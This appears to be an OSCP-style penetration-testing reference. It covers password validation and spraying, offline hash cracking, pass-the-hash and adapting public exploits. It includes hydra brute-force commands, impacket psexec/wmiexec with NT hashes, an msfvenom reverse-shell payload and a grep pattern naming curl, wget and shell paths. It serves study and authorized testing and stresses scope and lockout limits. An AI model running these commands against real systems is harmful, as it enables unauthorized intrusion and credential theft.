methods.title: Validate known passwords and context-specific reuse
methods.clue: A password tied to a plausible user and service
methods.conditions: Correct local/domain/application identity, reachable compatible service, accepted authentication and account state
methods.access: A credential artifact with a recorded source and possible account context
methods.result: A verified authentication result followed by tested service-specific authorization
methods.mechanics: One password may belong to several independently managed identities. Authentication success is useful only when associated with a precise service and allowed action.
methods.checks:
```bash
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD'
ssh -p PORT USER@TARGET
```
methods.example: Observation: a configuration contains a username/password. Test: validate the source application first, then an evidence-backed OS/domain reuse. Illustrative output: SMB authenticates but no administrative access exists. Interpretation: enumerate readable shares rather than assume execution.
methods.verify: Record exact identity, service and tested read/write/session effect; classify authentication and authorization separately.
methods.failure: Account disabled, expired password, wrong domain and denied logon require different responses. Avoid repeating a known-valid password against a denied action.

recognition.where: Use the account label from the producing source and the observed service inventory to choose one compatible, correctly qualified validation.
recognition.sample:
SMB TARGET [+] DOMAIN\USER: accepted
Administrative execution: not yet demonstrated
recognition.spot: Accepted authentication proves one service/account pairing; it does not establish shares, administration, RDP or WinRM.
recognition.confirm: Qualify local/domain/application identity explicitly, test a compatible reachable service and record the accepted identity. Then test the specific share/logon/execution right; successful authentication is not administrative authorization.
recognition.enabled: The intended service operation succeeds under the recorded identity: use that access and re-enumerate.
recognition.ruledout: The secret is valid only for the application and not the proposed OS account: reject that reuse pairing.
recognition.unknown: A generic logon failure may hide account/domain/state mismatch; classify it before repeating attempts.

methods.procedure:
Use the normal client for the observed service: ```bash ssh -o PreferredAuthentications=password -p PORT USER@TARGET nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares evil-winrm -i TARGET -u USER -p 'PASSWORD' xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore ``` Local Windows account: ```bash nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares ``` > **Decisive output:** the destination service accepts the intended identity. Share, session or action access is a separate authorization result.
Variant — known user, targeted password dictionary ```bash hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET hydra -l USER -P WORDLIST -t 1 -f rdp://TARGET ``` Use only on an assigned target after checking lockout and rate controls. Confirm every reported success with the normal client.
Variant — one password across an authorized user list ```bash hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET nxc smb TARGET -d DOMAIN -u USERS -p 'PASSWORD' --continue-on-success ``` One attempt per account can still trigger lockout or monitoring. Establish scope, threshold/window and observation period first.
Variant — HTTP POST form Capture a correct request and stable failure marker with Burp: ```bash hydra -l USER -P WORDLIST TARGET http-post-form \ '/LOGIN_PATH:username=^USER^&password=^PASS^:F=STABLE_FAILURE_TEXT' ``` Dynamic CSRF tokens, cookies, redirects, throttling and uniform responses require manual handling or a different approach. A weak failure marker creates false positives.
RunasCs — test a known password from an existing Windows shell Use a reviewed, compatible build on the current Windows host with a known plaintext password. This creates a new local process/logon context; it is not remote execution and does not turn an NT hash into a password. ```cmd REM Domain account: verify the new process token RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN REM Local account: omit the domain switch for the current host's account RunasCs.exe USER PASSWORD "cmd /c whoami /all" REM Network-only credentials: local identity stays unchanged RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9 ``` > **Read:** in the first two forms, whoami identifies the created process; inspect its groups/integrity before claiming escalation. With logon type 9, local whoami is not a credential test: use the remote operation's result. Logon failure → check account scope, password and permitted logon type. An accepted logon with access denied → inspect authorization on that resource. [RunasCs upstream](https://github.com/antonioCoco/RunasCs). Native runas remains an alternative when an interactive password prompt is usable. Neither tool guarantees an elevated token.
```text accepted identity -> groups/roles -> reachable services -> shares/files -> authenticated application behavior -> accessible hosts/routes -> new credentials/tickets/sessions -> privilege and movement handoffs ``` Verify destination host, accepted identity and actual read/write/execute rights. New hosts/listeners return to discovery; recovered material returns here; operating-system execution enters session handling; domain identities enter AD mapping. ```cmd net accounts /domain ``` ```powershell Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess ``` Password validation belongs to the existing [credential procedure](https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/04-shells-transfers-credentials/03-credential-use-and-cracking.md). Do not spray by default. If explicitly required, account for lockout threshold, duration, observation window and prior failures; use one justified candidate, stop on lockout/rate-limit evidence and preserve successful identities separately.

methods.title: Recover passwords with feasible dictionary, rule and mask attacks
methods.clue: A supported stored verifier or converted protected artifact
methods.conditions: Correct format/mode, complete salt/context, justified candidates and an available offline tool/backend
methods.access: A credential artifact with a recorded source and possible account context
methods.result: A recovered candidate password or a documented exhausted search strategy
methods.mechanics: Offline cracking compares candidate-derived values without contacting the service. Dictionary rules and masks model likely structure; infeasible keyspaces do not become useful through a different tool name.
methods.example: Observation: a supported verifier and a naming/password-pattern clue exist. Test: validate the mode with a known-format sample and apply a focused rule strategy. Illustrative output: one candidate recovers the verifier. Interpretation: verify it against the intended identity/service.
methods.verify: Use the tool's show/result output and then validate the recovered credential in its correct context.
methods.failure: Token/separator errors imply wrong or incomplete input; no recovery means only the tested candidate space was exhausted.

recognition.where: Identify a supported verifier/converter and build candidate structure from relevant names/policy/context rather than selecting an arbitrary hash mode.
recognition.sample:
Artifact format matches SUPPORTED_MODE
Candidate model: relevant words plus a justified suffix pattern
recognition.spot: A verified format and feasible candidate model enable offline recovery; a hash-shaped string alone does not.
recognition.confirm: Check complete salt/context, conversion correctness, tool backend and whether all required factors are present.
recognition.enabled: The verifier and candidate space are valid: use the selected offline strategy and verify recovered credentials.
recognition.ruledout: The artifact is a non-crackable token or unsupported format under this workflow: reject that mode.
recognition.unknown: Parsing errors or an incomplete source require input repair; no recovery only exhausts the tested candidates.

methods.procedure:
```bash hashcat -b -m MODE python3 -c "print((CHARSET_SIZE ** LENGTH) / GUESSES_PER_SECOND)" ``` Use the actual mode and hardware rate. Salts prevent reusable precomputation; iterations and memory-hard KDFs reduce guesses per second. Prefer candidates in this order: ```text exact recovered/default candidates -> organization/user/product words -> observed policy and mutations -> small dictionary plus rules -> known mask/hybrid -> broader curated lists/rules -> exhaustive search only when its measured cost is defensible ``` Preview mutations before spending the candidate budget: ```bash hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -n 50 john --wordlist=wordlist.txt --rules=Jumbo --stdout | head -n 50 ``` ```bash hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job hashcat -m MODE hashes.txt --show ``` > `-a 0` is dictionary mode. Do not use `-a 3` with a wordlist; attack mode 3 expects a mask. Common source examples identify NTLM as mode `1000`, Net-NTLMv2 as `5600` and KeePass as `13400`, but confirm against the installed version: ```bash hashcat -h | grep -Ei 'NTLM|NetNTLMv2|KeePass|OpenSSH' ```
Mask and session variants ```bash hashcat -m MODE hashes.txt -a 3 '?u?l?l?l?l?d?d?d' --session targeted-mask hashcat --session targeted-mask --restore ``` > Mask order is a hypothesis about structure. Estimate its keyspace before committing time.
Hybrid variant — base word plus three digits ```bash hashcat -a 6 -m MODE hashes.txt wordlist.txt '?d?d?d' --session targeted-hybrid ``` Use only when evidence supports both the base words and suffix shape.
```bash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt ``` ```bash john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt john --session=crack-job --wordlist=wordlist.txt hash.txt john --restore=crack-job ``` File-to-hash converters: ```bash zip2john archive.zip > archive.hash 7z2john archive.7z > archive.hash ssh2john id_rsa > ssh.hash keepass2john vault.kdbx > keepass.hash pdf2john document.pdf > pdf.hash office2john document.docx > office.hash rar2john archive.rar > rar.hash unshadow passwd.copy shadow.copy > linux.hash ``` Converter availability varies by package/path; locate it rather than assuming: ```bash command -v ssh2john || find /usr/share/john -maxdepth 2 -iname '*2john*' 2>/dev/null ``` > Preserve the complete converter output. Some formats include a filename label before `:` that John accepts but Hashcat may require removed from a separate tool-specific copy.

methods.title: Recover a protected KeePass database password
methods.clue: A readable KeePass database and possible associated key file
methods.conditions: Complete database, compatible converter, and every required factor; a feasible password candidate strategy
methods.access: A credential artifact with a recorded source and possible account context
methods.result: An opened vault or a valid recovered database password
methods.mechanics: Cracking targets the database's password-derived protection. A key file or other required factor is independent; the password alone may not unlock the vault.
methods.example: Observation: a backup contains a vault. Test: inspect required factors and convert its verifier. Illustrative output: the candidate is recovered but the vault still requests a key file. Interpretation: search the relevant backup context for that factor.
methods.verify: Open the database with all factors and distinguish vault credentials from target account credentials.
methods.failure: Missing factors, unsupported versions or malformed conversion require fixing the input, not endless password guessing.

recognition.where: Look for a vault in readable backups/shares/application data, then inspect file identity and nearby factor/configuration references.
recognition.sample:
FILE: Keepass password database
Converter: supported verifier produced
Possible additional key file: KEY_FILE
recognition.spot: A supported database gives a recovery target, but a referenced key file indicates a separate factor.
recognition.confirm: Confirm vault version, required key/account factors and a feasible password search.
recognition.enabled: All required factors are available and the recovered password opens the vault: inspect its typed credentials.
recognition.ruledout: An unavailable mandatory key factor prevents this password-only route.
recognition.unknown: A converter result alone does not identify every required factor; inspect relevant vault configuration.

methods.procedure:
```bash
keepass2john vault.kdbx > keepass.hash
john --wordlist=wordlist.txt keepass.hash
john --show keepass.hash
```

Hashcat alternative after confirming KDBX/KDF and input format:

```bash
hashcat -hh | grep -i keepass
hashcat -a 0 -m 13400 keepass.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13400 keepass.hash --show
```

> Mode `13400` covers common KeePass 1/2 AES formats. Installed help and example hashes decide for the actual file. A recovered master password still requires opening and validating the vault.

methods.title: Inspect and recover SSH private-key access
methods.clue: A private key from a file read, share, repository or home directory
methods.conditions: Correct key format, passphrase if encrypted, matching server account/key authorization and accepted algorithm/policy
methods.access: A credential artifact with a recorded source and possible account context
methods.result: A usable key and a verified SSH authentication context
methods.mechanics: A private-key passphrase protects the file locally; it is not the remote account password. Server acceptance still depends on user, authorized key, ownership and SSH policy.
methods.example: Observation: a key parser requests a passphrase. Test: recover its protection using the linked converter procedure, then authenticate as the evidence-backed user. Illustrative output: the key decrypts but the server rejects that username. Interpretation: revisit account mapping rather than cracking again.
methods.verify: Verify the key parses and an SSH authentication/session succeeds under the correct target identity.
methods.failure: Invalid format, line endings, wrong passphrase and server rejection are separate layers.

recognition.where: Trace readable key files from home/configuration/backups to a specific username; inspect the key parser's response before testing the server.
recognition.sample:
KEY: OpenSSH private key
Enter passphrase for KEY:
recognition.spot: The artifact is a private key protected by a local passphrase; this is separate from the SSH account password.
recognition.confirm: Determine the protecting passphrase, associated remote user, accepted algorithm and server key authorization.
recognition.enabled: The key parses and the correct server account accepts it: use its permitted shell/subsystem/forwarding capability.
recognition.ruledout: The artifact contains only a public key: reject private-key authentication with that file.
recognition.unknown: A decrypted key rejected by the server leaves username/authorization/policy unresolved.

methods.procedure:
```bash ssh2john id_rsa > ssh.hash john --wordlist=wordlist.txt ssh.hash john --show ssh.hash chmod 600 id_rsa ssh-keygen -y -f id_rsa > derived.pub ssh -vv -i id_rsa -o IdentitiesOnly=yes -p PORT USER@TARGET ``` > Cracking a key passphrase unlocks the file; it does not prove the matching public key is authorized. `Permission denied (publickey)` can mean wrong user/server, missing authorization or server algorithm/policy after a successful local unlock.
Hashcat variant — only for a supported OpenSSH format ```bash hashcat -hh | grep -i 'OpenSSH\|Private Key' hashcat -a 0 -m MODE ssh.hash wordlist.txt -r RULE_FILE ``` Choose `MODE` from the complete `$sshng$...` structure and installed help. Token-length or unsupported-cipher errors require a compatible parser/tool, not `--force` with a wrong mode.

methods.title: Recover Linux account passwords from matched records
methods.clue: Readable password verifiers and account metadata
methods.conditions: Correct passwd/shadow pairing or known hash format; account identity and a feasible recovery strategy
methods.access: A credential artifact with a recorded source and possible account context
methods.result: A recovered local account password with a justified privilege/reuse test
methods.mechanics: The verifier encodes algorithm and salt; passwd metadata maps it to a user. Reading a verifier does not itself change UID or authorize sudo.
methods.checks:
```bash
unshadow passwd.txt shadow.txt > linux.hashes
john --wordlist=WORDLIST linux.hashes
```
methods.example: Observation: a backup exposes account metadata and shadow records. Test: combine the matched pair and recover one selected account. Illustrative output: a password is shown for a local user. Interpretation: validate that local identity and inspect its rights.
methods.verify: Tie the recovered password to the correct user and validate an allowed login/sudo transition.
methods.failure: Mismatched snapshots or locked/expired accounts can defeat use even after recovery; inspect account state.

recognition.where: Inspect permission-backed account backups or privileged read results; associate shadow verifiers with the matching passwd metadata.
recognition.commands:
```bash
file passwd.txt shadow.txt
head -n 3 passwd.txt
head -n 3 shadow.txt
```
recognition.sample:
passwd: USER:x:USER_ID:GROUP_ID:...:/home/USER:/bin/bash
shadow: USER:$ALGORITHM$SALT$VERIFIER:...
recognition.spot: The matching account name and verifier prefix identify an offline password-recovery candidate.
recognition.confirm: Confirm snapshots, hash format and account state; a locked field or absent salt is not a normal usable verifier.
recognition.enabled: A complete supported verifier and feasible candidate space exist: recover, then validate the matching account.
recognition.ruledout: The password field is locked with no usable verifier: reject recovery from that field.
recognition.unknown: Mismatched backups or unknown account scope require source consistency checks.

methods.procedure:
```bash
unshadow passwd.copy shadow.copy > linux.hash
john --wordlist=wordlist.txt --rules=Jumbo linux.hash
john --show linux.hash
```

> Preserve username, UID, shell and lock markers. A recovered password does not override SSH settings, `su` policy or a disabled account.

methods.title: Recover or reuse an NT password hash
methods.clue: An NT verifier from an appropriate credential source
methods.conditions: Correct account/domain and actual NT hash; recovery mode or an accepting NTLM service with required destination rights
methods.access: A credential artifact with a recorded source and possible account context
methods.result: A recovered password or a verified hash-backed authentication capability
methods.mechanics: Pass-the-Hash uses a long-term NT key in an NTLM exchange; it does not convert every captured hash-like value into a reusable password equivalent.
methods.checks:
```bash
hashcat -m 1000 hashes.txt WORDLIST
nxc smb TARGET -d DOMAIN -u USER -H HASH
```
methods.example: Observation: a matched SAM/SYSTEM extraction yields a local NT hash. Test: qualify the target-local identity for one reachable service. Illustrative output: authentication succeeds but execution is denied. Interpretation: record valid authentication and investigate effective rights.
methods.verify: Verify source/type, identity context and the exact permitted service action.
methods.failure: Local/domain confusion, remote UAC and denied NTLM are different from an invalid hash. Use tickets only when their own prerequisites exist.

recognition.where: Inspect the output schema of a justified local/domain credential source, keeping RID, machine and domain labels.
recognition.sample:
USER:RID:LM_HASH:NT_HASH:::
Source: matched local registry extraction
recognition.spot: The source and record fields identify an NT verifier for that local account, not a captured challenge response.
recognition.confirm: Verify the actual NT field, account scope and an accepting service/client with the required destination right.
recognition.enabled: A compatible service accepts the correctly qualified hash identity: use only its verified authorization.
recognition.ruledout: The source produced Net-NTLMv2 or DCC2 instead: reject direct NT-hash reuse.
recognition.unknown: An unlabeled hexadecimal value remains unknown until the source/account is resolved.

methods.procedure:
Offline recovery: ```bash hashcat -a 0 -m 1000 nt.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule john --format=NT --wordlist=wordlist.txt nt.hash ``` Compatible SMB validation: ```bash nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares smbclient //TARGET/SHARE -U 'DOMAIN\USER' --pw-nt-hash NT_HASH ``` > NT hashes come from a producing context such as SAM, LSASS or NTDS. A visually similar 32-hex application digest is not PtH material.
Variant — remote access/execution when the identity has matching rights ```bash impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore ``` WMI needs administrative rights plus DCOM/RPC/SMB reachability and normally runs as the authenticated user. PsExec-style execution needs service-control and writable-share rights and commonly yields SYSTEM. RDP hash authentication depends on target/client support and policy. Detailed method selection belongs to the lateral-movement procedure.

methods.title: Recover a password from a captured NTLM response
methods.clue: A complete challenge-response record
methods.conditions: Correct challenge/response formatting and feasible candidates; acquisition method must fit the allowed context
methods.access: A credential artifact with a recorded source and possible account context
methods.result: A recovered password from the response's offline verifier
methods.mechanics: The captured response is bound to its challenge and exchange. It is not an NT hash for direct Pass-the-Hash; relay is a separate live protocol mechanism with additional policy and signing prerequisites.
methods.example: Observation: a complete response capture is available from an authorized lab record. Test: run the correct offline mode. Illustrative output: a password is recovered. Interpretation: validate its account context rather than feeding the response to a hash-authentication client.
methods.verify: Retain response provenance and recovered account/password mapping; confirm relevant login rights separately.
methods.failure: Incomplete captures or wrong separators break recovery. Prohibited spoofing/poisoning workflows are not an operational exam acquisition method.

recognition.where: Use the saved authorized capture's structure and source context; inspect username/domain/challenge/response fields before selecting recovery.
recognition.sample: USER::DOMAIN:SERVER_CHALLENGE:NT_PROOF:BLOB
recognition.spot: A challenge-bound response supports its appropriate offline verification workflow; it is not the long-term NT hash.
recognition.confirm: Check complete capture format, account mapping and feasible candidates; acquisition/relay policy is a separate issue.
recognition.enabled: A complete supported record permits offline recovery and later password validation.
recognition.ruledout: Using this response directly as an NT hash is the wrong mechanism: reject that authentication attempt.
recognition.unknown: Truncated challenge/blob fields cannot support a valid recovery conclusion.

methods.procedure:
```bash
hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt
john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash
```

> A Net-NTLMv2 response is not an NT hash and cannot be supplied to `-H` or `-hashes`. Relay forwards a live authentication exchange and requires received/coerced authentication, compatible protocols, signing/channel-binding conditions and useful rights.

The OSCP+ exam prohibits spoofing, including NBNS. Do not use Responder poisoning on the exam. Keep capture/relay work to explicitly authorized labs and recheck the current guide.

methods.mechanics: Cached interactive-logon verifiers support offline logon checks; they are not reusable NT hashes. Their derivation makes cracking materially different from NT recovery.

recognition.spot: The DCC2 structure and username-associated derivation identify offline cached-logon material.
recognition.confirm: Verify iteration/username context, source consistency and current online account state after any recovery.

methods.clue: A ccache/kirbi file or an existing ticket cache
methods.conditions: Correct principal/realm, valid lifetime, service scope, compatible cache format and naming/KDC route

methods.result: A verified Kerberos authentication capability for an appropriate service
methods.mechanics: A TGT can request service tickets; a TGS is scoped to a service/SPN. A ticket for CIFS cannot simply be used as a WinRM credential.

recognition.sample:
Default principal: USER@REALM
Service principal: cifs/TARGET_HOST@REALM
No krbtgt ticket listed
recognition.spot: This is service-scoped CIFS material, not a TGT for requesting arbitrary services.
recognition.confirm: Check lifetime, cache format, exact SPN/name, route and destination object authorization.
recognition.enabled: The matching SMB service accepts the ticket and allowed operation: use that scoped capability.
recognition.ruledout: A CIFS-only ticket does not enable a WinRM-specific authentication path.

```bash
KRB5CCNAME=TICKET.ccache klist
```

methods.title: Match a public exploit to the actual component and configuration
methods.clue: A product/version clue, advisory or component-specific public PoC
methods.conditions: Exact vulnerable build/configuration, required access and endpoint behavior; reviewable source and a verifiable expected effect
methods.access: An identified component/build and a candidate exploit with reviewable source
methods.result: A justified exploit candidate or a documented prerequisite mismatch
methods.mechanics: Version resemblance is weaker than exact applicability. Authentication, feature state, architecture and patch backports can invalidate a published exploit even when the banner looks right.
methods.example: Observation: a banner resembles a vulnerable release. Test: compare advisory prerequisites with enabled features and the actual transaction. Illustrative output: the vulnerable feature is disabled. Interpretation: reject this candidate and inspect other application behavior.
methods.verify: Write the evidence for every prerequisite and the minimal effect that would validate the hypothesis.
methods.failure: A scanner's CVE label or a copied walkthrough command is insufficient. Resolve the build/feature gap before running the PoC.

recognition.where: Join application fingerprint/configuration evidence with the advisory and PoC's stated preconditions before selecting the exploit.
recognition.sample:
Candidate requires: FEATURE enabled, authenticated ROLE, affected BUILD
Observed deployment: FEATURE state not yet known
recognition.spot: The exact feature/role/build conditions identify what must be checked; a product-name hit does not establish applicability.
recognition.confirm: Resolve every required condition and define the smallest observable proof of the expected effect.
recognition.enabled: Build, feature and access conditions match: review and test the candidate's bounded effect.
recognition.ruledout: The required feature is disabled or the build is patched: reject that candidate.
recognition.unknown: A generic banner cannot resolve patch/feature state; gather deployment evidence first.

methods.procedure:
```text source URL/EDB-ID/CVE/commit: product + component + edition/build: target OS/architecture/runtime: remote or local; pre-auth or authenticated: required configuration/feature/path/credential/privilege: expected effect: exploit runtime and dependencies: hard-coded target/callback/payload assumptions: destructive or stability risk: evidence each prerequisite exists: ``` Do not substitute a scanner label for component evidence. Check vendor/version output, application behavior, files/configuration and the exploit's own affected-version notes. Distribution backports, disabled features, authentication and mitigations can invalidate a simple version match. ```bash searchsploit --cve CVE searchsploit -t "PRODUCT VERSION" searchsploit PRODUCT VERSION --exclude="/dos/" ``` Inspect before copying: ```bash searchsploit -p EDB_ID searchsploit -x EDB_ID searchsploit -w "PRODUCT VERSION" ``` Copy a working copy, never edit the archive in place: ```bash mkdir -p exploit-work cd exploit-work searchsploit -m EDB_ID sha256sum EXPLOIT_FILE file EXPLOIT_FILE ``` > **Selection cue:** prefer a readable, reputable or verified exploit whose prerequisites and outcome match the observed component. Exclude denial-of-service entries when the objective is access. A named Nmap NSE script can validate or exercise a specific known condition, but inspect it and its arguments first: ```bash nmap --script-help SCRIPT_NAME sed -n '1,240p' /usr/share/nmap/scripts/SCRIPT_NAME.nse nmap -Pn -p PORT --script SCRIPT_NAME --script-args 'ARG=VALUE' TARGET ``` Script categories such as `intrusive`, `exploit`, `brute` or `dos` change risk and authorization requirements. A script-reported vulnerable result remains a candidate until its underlying evidence or controlled effect is validated.
Variant — source repository rather than Exploit-DB Record and pin the exact source state: ```bash git clone REPOSITORY_URL exploit-source cd exploit-source git log -1 --format='%H %ad %s' --date=iso-strict git status --short ``` Read the README, license, dependency files, open issues relevant to the target version and the actual execution path. A popular repository is not automatically safe or compatible.
Variant — a matching Metasploit exploit module Use only in an authorized lab or after committing the current exam's one allowed Metasploit/Meterpreter target. Even `check` against a target consumes that choice under the current guide. ```text msfconsole -q search type:exploit PRODUCT CVE info MODULE_NAME use MODULE_NAME show options show targets show payloads set RHOSTS TARGET set RPORT PORT set TARGET TARGET_ID set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT check run ``` Read `info`, verify the module's affected versions/references, select the explicit target profile and inspect every required option. A module rank or `check` result does not replace exact prerequisite validation or session verification.

methods.title: Audit a PoC and reproduce its interpreter/dependency environment
methods.clue: A plausible exploit fails before reaching the target or has unreviewed side effects
methods.conditions: Reviewed source, understood network/file actions, correct interpreter and compatible isolated dependencies
methods.access: An identified component/build and a candidate exploit with reviewable source
methods.result: A controlled, reproducible tool environment and an understood PoC
methods.mechanics: A syntax/import/dependency failure is a local environment issue, not evidence that the target is patched. Dependencies and downloaded payloads can themselves execute code.
methods.example: Observation: a PoC exits with an import error before any request. Test: inspect imports and reproduce its documented environment. Illustrative output: local initialization succeeds. Interpretation: proceed to the target transaction; no vulnerability conclusion was possible earlier.
methods.verify: Confirm interpreter/dependency identity and observable intended request behavior; preserve the reviewed source and changes.
methods.failure: Do not solve every old script with a global package change. Inspect Python-version semantics and choose a supported environment or minimal reviewed edit.

recognition.sample:
Traceback: ModuleNotFoundError: REQUIRED_MODULE
No target request observed
recognition.spot: The failure occurred locally before the vulnerable request; it says nothing about target patch state.
recognition.confirm: Review side effects, reproduce supported dependencies/interpreter and observe the real request before judging exploitation.
recognition.enabled: A controlled environment runs the reviewed request: proceed to prerequisite/effect testing.
recognition.ruledout: The script's assumptions target a different runtime/protocol and cannot match this candidate: reject it.
recognition.unknown: An import error leaves target behavior unknown; isolate the environment and repair the documented dependency.

methods.procedure:
Start with metadata and readable text:

```bash
file EXPLOIT_FILE
sha256sum EXPLOIT_FILE
sed -n '1,240p' EXPLOIT_FILE
grep -nEi 'sudo|setuid|chmod|chown|rm |unlink|remove|subprocess|system\(|popen|exec\(|socket|connect|requests|curl|wget|powershell|cmd\.exe|/bin/(ba)?sh|http://|https://' EXPLOIT_FILE
```

For binaries, prefer obtaining inspectable source. If only a binary exists, treat it as a substantially higher-risk choice:

```bash
file EXPLOIT_BINARY
sha256sum EXPLOIT_BINARY
strings -a EXPLOIT_BINARY | less
objdump -f EXPLOIT_BINARY
```

Audit for:

- unexpected privilege requirements on the attacking host;
- destructive file/process/service operations or denial of service;
- downloads, callbacks or telemetry to third parties;
- embedded credentials, tokens, commands or payloads;
- files written or overwritten and their cleanup behavior;
- hard-coded target addresses, ports, paths, virtual hosts and callback values;
- authentication, cookie, CSRF, redirect, TLS and proxy assumptions;
- target OS, architecture, runtime, library and payload assumptions;
- success messages that are printed without verifying the claimed effect.

> **Safety cue:** use source, a disposable environment and a clean snapshot when uncertainty remains. Do not grant `sudo` merely because an unknown PoC requests it.

```bash
head -n 1 EXPLOIT_FILE
python3 --version
gcc --version
file EXPLOIT_FILE
```

Separate three architectures:

1. where the exploit program itself runs;
2. the vulnerable target process;
3. the payload that will execute inside or on the target.

A remote Python exploit may run on Kali while delivering a Windows x64 payload. A local Linux exploit normally must run on the target-compatible architecture. Compiler choice follows the produced program; payload choice follows the target execution context.

After source review:

```bash
python3 -m py_compile exploit.py
python3 exploit.py --help
```

Isolate explicit dependencies:

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
python -m pip freeze > requirements-resolved.txt
```

> Run `--help` only after confirming that module import and argument handling do not trigger the exploit. Old Python 2 syntax, `str`/`bytes` mistakes, renamed modules and obsolete TLS dependencies are runtime problems, not target evidence.

Useful diagnostics:

```bash
python3 -X dev exploit.py ARGUMENTS
python3 -m trace --trace exploit.py ARGUMENTS
```

Use tracing only when its output is bounded and does not expose credentials. Prefer adding a few prints around the failing request/parser over changing many lines at once.

> **Use when:** a source-based Python assessment tool has dependencies that should not modify Kali's system Python. This is setup/reference material, not authorization to install a tool.

##### Linux/Kali virtual environment

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
```

Install one explicitly selected package only when needed:

```bash
python -m pip install PACKAGE
```

```bash
python -m pip show PACKAGE
python -m pip freeze
deactivate
```

PEP 668 intentionally protects externally managed system environments. Do not bypass it with `--break-system-packages`; use a venv or the distribution package when appropriate.

##### Windows PowerShell

```powershell
py -m venv .venv
.\.venv\Scripts\Activate.ps1
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
deactivate
```

##### Reproducibility checks

```bash
python --version
python -m pip --version
python -m pip freeze > requirements-resolved.txt
```

Record the tool source/commit, Python version, dependency file and exact command. Keep environments per tool when their dependency ranges conflict.

methods.mechanics: Compilation architecture and target process architecture must match the PoC's assumptions. Existing offsets, bad-character constraints or payload space are exploit-specific; dedicated exploit development is outside this preparation route.
methods.example: Observation: a reviewed PoC targets a 32-bit process on a 64-bit host. Test: verify its process and compiler requirements before building. Illustrative output: the correct architecture artifact loads while a native 64-bit build did not. Interpretation: now test the documented effect.
methods.verify: Verify artifact format, architecture, required runtime and actual exploit effect independently.
methods.failure: A crash is not a shell; wrong ABI, mitigation/configuration or constants can invalidate a candidate. Return to its prerequisites rather than inventing an exploit-development exercise.

recognition.where: Inspect the native PoC's documented target process, compiler flags, ABI and artifact before running it in a target context.
recognition.sample:
Artifact: ELF 64-bit x86-64
PoC prerequisite: 32-bit target process
recognition.spot: An architecture/ABI mismatch explains a compatibility problem before exploit logic is evaluated.
recognition.confirm: Confirm target process rather than just OS architecture, required libraries/loader and documented exploit-specific constraints.
recognition.enabled: A compatible reviewed artifact and exact target conditions exist: test its bounded effect.
recognition.ruledout: The target's architecture/mitigation assumptions do not match: reject that PoC route.
recognition.unknown: Compiler success alone leaves loader and exploit applicability unresolved.

methods.procedure:
Linux/ELF program:

```bash
gcc -Wall -Wextra exploit.c -o exploit
file exploit
ldd exploit
sha256sum exploit
```

32-bit output requires matching headers/libraries:

```bash
gcc -m32 -Wall -Wextra exploit.c -o exploit32
file exploit32
```

Windows PE from Kali:

```bash
i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe
x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe
file exploit-x86.exe exploit-x64.exe
```

Windows socket code commonly needs the Winsock import library:

```bash
i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe -lws2_32
x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe -lws2_32
```

> **Failure cue:** undefined references are linker evidence. Identify the missing symbol and documented library; do not delete calls until the binary compiles. `Exec format error` means the produced format/architecture cannot run in the current environment.

Change one assumption at a time and retain a diff:

```bash
cp EXPLOIT_FILE EXPLOIT_FILE.orig
git diff --no-index -- EXPLOIT_FILE.orig EXPLOIT_FILE
```

Typical adaptations are:

| Assumption | Evidence-backed edit |
| --- | --- |
| Target address/port | Observed reachable endpoint |
| HTTP/HTTPS and base path | Reproduced application request |
| Virtual host or `Host` header | Resolved application identity |
| Username/password/cookie | Valid Block 5 authentication context |
| CSRF/session parsing | Actual request/response sequence |
| LHOST/LPORT | Address and listener reachable from the target context |
| Command or payload | Target OS, interpreter, architecture, size and bad-character constraints |
| File path/name | Writable/executable target path and application behavior |
| Timeout/retry | Measured service behavior, not blind delay inflation |

Do not combine prerequisite repair, payload replacement and parser rewrites in one unreviewable change.

> Dedicated overflow development, offset drills and shellcode development are excluded from this speedrun. Use this section only to understand and adapt an existing PoC whose vulnerable build and assumptions are supported by evidence.

Review the PoC comments and code for:

- exact vulnerable build and target architecture;
- hard-coded target/callback address and port;
- return address/module assumptions and target profiles;
- recorded offset, available payload space and bad characters;
- payload architecture, type and exit behavior;
- crash/restart and reliability expectations.

Replace an embedded payload only when the PoC documents its constraints:

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=LHOST LPORT=LPORT \
  -f c -v payload \
  -b '\x00\x0a\x0d'
```

Use the PoC's actual bad-character and space requirements; the example list is not universal. A changed build, missing module, mitigation or misaligned offset invalidates the PoC and should not trigger a fresh exploit-development detour in this route.

methods.title: Repair a web PoC using the real HTTP transaction
methods.clue: An exploit sends requests but authentication, routing or parsing differs from the target
